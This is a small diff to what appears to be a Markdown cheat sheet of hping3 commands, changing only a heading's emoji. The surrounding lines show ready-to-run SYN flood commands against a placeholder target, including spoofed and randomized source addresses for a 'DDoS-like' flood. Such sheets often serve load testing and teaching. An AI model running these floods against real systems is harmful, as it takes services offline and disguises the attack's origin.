@@ -46,7 +46,7 @@ hping3 -S -p 80 -c 10000 <target-ip>
 hping3 -S -p 80 -a 1.2.3.4 -c 10000 <target-ip>
 ```
 
-### DDoS-Like SYN Flood (Randomized IPs)
+### 🌐DDoS-Like SYN Flood (Randomized IPs)
 ```bash
 hping3 -S --flood --rand-source -p 80 <target-ip>
 ```
